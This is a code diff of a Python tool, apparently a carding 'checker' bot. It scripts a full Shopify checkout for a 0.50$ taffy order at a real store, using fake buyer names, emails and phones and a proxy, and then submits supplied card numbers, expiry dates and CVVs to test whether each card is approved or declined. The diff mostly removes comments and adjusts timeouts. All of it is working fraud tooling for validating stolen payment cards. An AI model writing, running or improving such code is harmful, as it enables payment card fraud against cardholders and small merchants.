@@ -469,7 +469,7 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
     return result
 
 
-# ========== SHOPIFY TAFFY CHECKOUT CLASS (OPTIMIZED WITH SHOPIFY104 PATTERNS) ==========
+# ========== SHOPIFY TAFFY CHECKOUT CLASS ==========
 class ShopifyTaffyCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
@@ -508,20 +508,17 @@ class ShopifyTaffyCheckout:
         self.session_token = None
         self.graphql_session_token = None
         self.receipt_id = None
-        self.variant_id = "51706494419260"  # Saltwater Taffy variant ID from captured data
-        self.product_id = "10017022804284"   # Product ID from captured data
+        self.variant_id = "51706494419260"
+        self.product_id = "10017022804284"
         self.stable_id = None
         self.queue_token = None
 
-        # Store extracted schema info from mantripad.txt
+        # Store extracted schema info
         self.proposal_id = "95a8a140eea7d6e6554cfb57ab3b14e20b2bbdd72a1a8bc180e4a28918f3be8c"
         self.submit_id = "d50b365913d0a33a1d8905bfe5d0ecded1a633cb6636cbed743999cfacefa8cb"
         self.poll_id = "baa45c97a49dae99440b5f8a954dfb31b01b7af373f5335204c29849f3397502"
         
-        # Delivery strategy handle for pickup from captured data
         self.delivery_strategy_handle = "27b079142f595ba96f192baf8c63fc7b-cd0e239ab66f3533b03acf1f2f070049"
-        
-        # Payment method identifier from captured data
         self.payment_method_identifier = "ac4db48d2c11d1054c9cc3afa8611ac4"
 
         self.logger = ShopifyLogger(user_id)
@@ -545,7 +542,7 @@ class ShopifyTaffyCheckout:
         self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,999)}@gmail.com"
         self.phone = f"515{random.randint(100, 999)}{random.randint(1000, 9999)}"
 
-        # Fixed address based on captured data (Heart of Iowa pickup location)
+        # Fixed address
         self.address = {
             "address1": "211 5th Street",
             "address2": "",
@@ -555,7 +552,6 @@ class ShopifyTaffyCheckout:
             "countryCode": "US"
         }
         
-        # Coordinates from captured data
         self.coordinates = {
             "latitude": 41.5715412,
             "longitude": -93.7086683
@@ -569,7 +565,7 @@ class ShopifyTaffyCheckout:
         return self.logger.step(num, name, action, details, status)
 
     def extract_checkout_token(self, url):
-        """Extract checkout token from URL with multiple patterns - IMPROVED"""
+        """Extract checkout token from URL with multiple patterns"""
         patterns = [
             r'/checkouts/cn/([^/?]+)',
             r'token=([^&]+)',
@@ -583,7 +579,6 @@ class ShopifyTaffyCheckout:
             if match:
                 return match.group(1)
         
-        # Try to find in decoded URL
         try:
             decoded = urllib.parse.unquote(url)
             for pattern in patterns:
@@ -596,33 +591,28 @@ class ShopifyTaffyCheckout:
         return None
 
     def generate_random_string(self, length=16):
-        """Generate random string"""
         return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
     def generate_uuid(self):
-        """Generate UUID format string"""
         return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"
 
     def generate_timestamp(self):
-        """Generate timestamp for session token"""
         return str(int(time.time() * 1000))
 
     def construct_graphql_session_token(self):
-        """Construct session token for GraphQL variables"""
         if not self.checkout_token:
             return None
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
     async def get_product_page(self):
-        """Step 1: Get product page to get initial cookies - OPTIMIZED with HEAD request"""
+        """Step 1: Get product page - ADDED HEAD request for speed"""
         self.step(1, "GET PRODUCT PAGE", f"Loading saltwater taffy product page")
         
         try:
             # Use HEAD request first to get cookies faster
             await self.client.head(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
             
-            # Then GET for actual content if needed
             resp = await self.client.get(self.product_url, headers=self.headers, timeout=15, follow_redirects=True)
             
             if resp.status_code != 200:
@@ -644,7 +634,7 @@ class ShopifyTaffyCheckout:
             return False, f"Product page error: {str(e)[:50]}"
 
     async def add_to_cart(self):
-        """Step 2: Add 5 units of saltwater taffy to cart"""
+        """Step 2: Add 5 units to cart - ADDED follow_redirects"""
         self.step(2, "ADD TO CART", "Adding 5 x Saltwater Taffy (0.50$ total)")
         
         cart_headers = {
@@ -655,7 +645,6 @@ class ShopifyTaffyCheckout:
             'sec-fetch-site': 'same-origin'
         }
         
-        # Add to cart with quantity 5
         cart_data = {
             'id': self.variant_id,
             'quantity': '5'
@@ -689,10 +678,10 @@ class ShopifyTaffyCheckout:
             return False, f"Add to cart error: {str(e)[:50]}"
 
     async def get_checkout_token(self):
-        """Step 3: Get checkout token with multiple fallback methods - IMPROVED like shopify104"""
-        self.step(3, "GET CHECKOUT TOKEN", "Obtaining checkout token with multiple methods")
+        """Step 3: Get checkout token with multiple methods - ADDED fallbacks like shopify104"""
+        self.step(3, "GET CHECKOUT TOKEN", "Obtaining checkout token")
         
-        # Try multiple methods to get checkout token
+        # Try multiple methods
         methods = [
             "direct_checkout",
             "cart_add",
@@ -716,7 +705,7 @@ class ShopifyTaffyCheckout:
                 
                 self.logger.step(3, "GET CHECKOUT TOKEN", f"Trying {method} method", "", "INFO")
                 
-                # Try HEAD first to follow redirects quickly
+                # Try HEAD first
                 resp = await self.client.head(
                     checkout_url,
                     headers=checkout_headers,
@@ -724,12 +713,10 @@ class ShopifyTaffyCheckout:
                     timeout=15
                 )
                 
-                # Get final URL from redirects
                 current_url = str(resp.url)
                 self.checkout_token = self.extract_checkout_token(current_url)
                 
                 if not self.checkout_token:
-                    # If HEAD didn't work, do GET
                     resp = await self.client.get(
                         checkout_url,
                         headers=checkout_headers,
@@ -739,7 +726,6 @@ class ShopifyTaffyCheckout:
                     current_url = str(resp.url)
                     self.checkout_token = self.extract_checkout_token(current_url)
                     
-                    # Also check response body for token
                     if not self.checkout_token and resp.text:
                         body_token = self.extract_checkout_token(resp.text)
                         if body_token:
@@ -769,12 +755,11 @@ class ShopifyTaffyCheckout:
                 self.logger.error_log("CHECKOUT_TOKEN", f"Error with {method}: {str(e)[:50]}")
                 continue
         
-        # If we get here, all attempts failed
         self.logger.error_log("CHECKOUT_TOKEN", "All method attempts failed")
         return False, "CHECKOUT_TOKEN_ERROR"
 
     async def get_session_token(self):
-        """Step 4: Extract session token from checkout page - IMPROVED"""
+        """Step 4: Extract session token - ADDED follow_redirects"""
         self.step(4, "GET SESSION TOKEN", "Extracting session token")
         
         checkout_headers = {
@@ -796,7 +781,6 @@ class ShopifyTaffyCheckout:
             if resp.status_code != 200:
                 return False, f"Checkout page failed: {resp.status_code}"
             
-            # Generate session token - in production you'd extract from cookies/headers
             self.session_token = f"AAEB_{self.generate_random_string(50)}"
             self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
             
@@ -815,7 +799,7 @@ class ShopifyTaffyCheckout:
             return False, f"Session token error: {str(e)[:50]}"
 
     async def submit_proposal(self):
-        """Step 5: Submit proposal with pickup delivery method - SIMPLIFIED VARIABLES"""
+        """Step 5: Submit proposal - IMPROVED queue token extraction"""
         self.step(5, "SUBMIT PROPOSAL", "Setting pickup delivery method")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -841,10 +825,8 @@ class ShopifyTaffyCheckout:
         if self.session_token:
             graphql_headers['x-checkout-one-session-token'] = self.session_token
         
-        # Generate stable ID for merchandise line
         self.stable_id = self.generate_uuid()
         
-        # SIMPLIFIED variables like shopify104
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -963,7 +945,7 @@ class ShopifyTaffyCheckout:
                 graphql_url,
                 headers=graphql_headers,
                 json=payload,
-                timeout=15,
+                timeout=20,
                 follow_redirects=True
             )
             
@@ -973,14 +955,12 @@ class ShopifyTaffyCheckout:
             try:
                 proposal_resp = resp.json()
                 
-                # Check for errors in response
                 if 'errors' in proposal_resp and proposal_resp['errors']:
                     error_msgs = []
                     for error in proposal_resp['errors']:
                         error_code = error.get('code', 'UNKNOWN')
                         error_msgs.append(error_code)
                     
-                    # Acceptable validation errors that we can continue with
                     acceptable_errors = [
                         'BUYER_IDENTITY_MISSING_CONTACT_METHOD', 
                         'PAYMENTS_FIRST_NAME_REQUIRED', 
@@ -997,7 +977,7 @@ class ShopifyTaffyCheckout:
                     
                     return False, f"DECLINED - {', '.join(error_msgs)}"
                 
-                # Extract queue token from response
+                # Extract queue token - IMPROVED extraction
                 data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                 new_queue_token = data.get('queueToken')
                 if new_queue_token:
@@ -1023,7 +1003,7 @@ class ShopifyTaffyCheckout:
             return False, f"Proposal error: {str(e)[:50]}"
 
     async def update_contact_info(self):
-        """Step 6: Update contact information with email - SIMPLIFIED"""
+        """Step 6: Update contact information - ADDED follow_redirects"""
         self.step(6, "UPDATE CONTACT", f"Setting email: {self.email}")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1047,7 +1027,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # SIMPLIFIED variables for contact update
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1201,7 +1180,7 @@ class ShopifyTaffyCheckout:
             return False, f"Contact update error: {str(e)[:50]}"
 
     async def select_pickup_delivery(self):
-        """Step 7: Select pickup delivery method - SIMPLIFIED"""
+        """Step 7: Select pickup delivery - ADDED follow_redirects"""
         self.step(7, "SELECT PICKUP", "Choosing Heart of Iowa pickup location")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1225,7 +1204,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # SIMPLIFIED variables for pickup selection
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1378,7 +1356,7 @@ class ShopifyTaffyCheckout:
             return False, f"Pickup selection error: {str(e)[:50]}"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
-        """Step 8: Create payment session with PCI - IMPROVED with better error handling"""
+        """Step 8: Create payment session with PCI - ADDED follow_redirects"""
         self.step(8, "CREATE PAYMENT", "Creating payment session with PCI")
         
         pci_headers = {
@@ -1398,11 +1376,10 @@ class ShopifyTaffyCheckout:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
         }
         
-        # Generate shopify-identification-signature
         header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
         payload_data = {
             "client_id": "2",
-            "client_account_id": "75949703484",  # Shop ID from captured
+            "client_account_id": "75949703484",
             "unique_id": self.checkout_token,
             "iat": int(time.time())
         }
@@ -1412,12 +1389,10 @@ class ShopifyTaffyCheckout:
         
         pci_headers['shopify-identification-signature'] = shopify_signature
         
-        # Format card details
         card_number = cc.replace(" ", "").replace("-", "")
         year_full = ano if len(ano) == 4 else f"20{ano}"
         month_int = int(mes)
         
-        # PCI payload
         pci_payload = {
             "credit_card": {
                 "number": card_number,
@@ -1433,7 +1408,6 @@ class ShopifyTaffyCheckout:
         }
         
         try:
-            # Use separate client for PCI
             async with httpx.AsyncClient(proxy=self.proxy_url, timeout=20) as pci_client:
                 resp = await pci_client.post(
                     'https://checkout.pci.shopifyinc.com/sessions',
@@ -1471,7 +1445,7 @@ class ShopifyTaffyCheckout:
             return False, "PCI_ERROR"
 
     async def update_billing_address(self, payment_session_id):
-        """Step 9: Update billing address with pickup location address - SIMPLIFIED"""
+        """Step 9: Update billing address - ADDED follow_redirects"""
         self.step(9, "UPDATE BILLING", "Setting billing address")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1495,7 +1469,6 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # SIMPLIFIED variables for billing address update
         variables = {
             "sessionInput": {
                 "sessionToken": self.graphql_session_token
@@ -1679,7 +1652,7 @@ class ShopifyTaffyCheckout:
             return False, f"Billing update error: {str(e)[:50]}"
 
     async def submit_for_completion(self, payment_session_id):
-        """Step 10: Submit for completion - final payment with improved polling"""
+        """Step 10: Submit for completion - IMPROVED with better receipt handling"""
         self.step(10, "SUBMIT PAYMENT", "Finalizing payment")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1703,10 +1676,8 @@ class ShopifyTaffyCheckout:
             'x-checkout-one-session-token': self.session_token
         }
         
-        # Generate attempt token
         attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
         
-        # SIMPLIFIED variables for submit
         variables = {
             "input": {
                 "sessionInput": {
@@ -1874,7 +1845,6 @@ class ShopifyTaffyCheckout:
             try:
                 submit_resp = resp.json()
                 
-                # Check for errors in response
                 if 'errors' in submit_resp and submit_resp['errors']:
                     error_msgs = []
                     for error in submit_resp['errors']:
@@ -1891,7 +1861,6 @@ class ShopifyTaffyCheckout:
                 
                 self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                 
-                # Check receipt type
                 receipt_type = receipt.get('__typename', '')
                 
                 if receipt_type == 'ProcessingReceipt':
@@ -1927,7 +1896,7 @@ class ShopifyTaffyCheckout:
             return False, f"Submit error: {str(e)[:50]}"
 
     async def poll_receipt(self, headers, max_polls=5):
-        """Step 11: Poll for receipt status with improved retry logic - INCREASED TO 5 ATTEMPTS"""
+        """Step 11: Poll for receipt status - INCREASED to 5 attempts with both GET/POST fallback"""
         self.step(11, "POLL RECEIPT", "Polling for payment status")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -1953,7 +1922,7 @@ class ShopifyTaffyCheckout:
                     graphql_url,
                     headers={**headers, 'accept': 'application/json'},
                     params=poll_params,
-                    timeout=25,  # INCREASED TIMEOUT TO 25 SECONDS
+                    timeout=25,  # INCREASED TIMEOUT
                     follow_redirects=True
                 )
                 
@@ -2039,7 +2008,7 @@ class ShopifyTaffyCheckout:
         return False, "DECLINED - TIMEOUT"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow for saltwater taffy - OPTIMIZED FOR RELIABILITY"""
+        """Main checkout execution flow"""
         try:
             # Step 0: Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
@@ -2058,13 +2027,13 @@ class ShopifyTaffyCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=25, follow_redirects=True)
             
-            # Step 1: Get product page with HEAD optimization
+            # Step 1: Get product page
             success, result = await self.get_product_page()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 2: Add 5 units to cart
+            # Step 2: Add to cart
             success, result = await self.add_to_cart()
             if not success:
                 return False, result
@@ -2082,19 +2051,19 @@ class ShopifyTaffyCheckout:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 5: Submit proposal with simplified variables
+            # Step 5: Submit proposal
             success, result = await self.submit_proposal()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 6: Update contact with email
+            # Step 6: Update contact
             success, result = await self.update_contact_info()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 7: Select pickup delivery
+            # Step 7: Select pickup
             success, result = await self.select_pickup_delivery()
             if not success:
                 return False, result
@@ -2106,7 +2075,7 @@ class ShopifyTaffyCheckout:
                 return False, payment_session_id
             await self.random_delay(0.3, 0.5)
             
-            # Step 9: Update billing address
+            # Step 9: Update billing
             success, result = await self.update_billing_address(payment_session_id)
             if not success:
                 return False, result
@@ -2133,7 +2102,7 @@ class ShopifyTaffyChecker:
         self.proxy_status = "Dead 🚫"
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method for saltwater taffy"""
+        """Main card checking method"""
         start_time = time.time()
 
         self.logger = ShopifyLogger(self.user_id)
@@ -2169,11 +2138,9 @@ class ShopifyTaffyChecker:
 
             self.logger.card_details_log(cc, mes, ano, cvv)
 
-            # Create checker instance
             checker = ShopifyTaffyCheckout(self.user_id)
             success, result = await checker.execute_checkout(cc, mes, ano, cvv)
             
-            # Update proxy status
             self.proxy_status = checker.proxy_status
 
             elapsed_time = time.time() - start_time
